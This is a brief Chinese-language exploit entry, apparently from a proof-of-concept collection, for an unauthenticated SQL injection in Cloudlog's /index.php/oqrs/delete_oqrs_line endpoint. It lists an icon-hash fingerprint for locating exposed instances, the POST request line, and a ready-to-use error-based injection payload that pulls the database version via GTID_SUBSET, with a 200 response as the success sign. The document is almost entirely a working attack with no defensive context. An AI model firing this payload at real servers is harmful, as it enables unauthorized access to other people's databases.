# Cloudlogdelete_oqrs_line未授权SQL注入漏洞

Cloudlogdelete ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-460032467"`
- **请求**：`POST /index.php/oqrs/delete_oqrs_line HTTP/1.1`

**Payload**
```
id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,190))),666)
```
- **响应特征**：200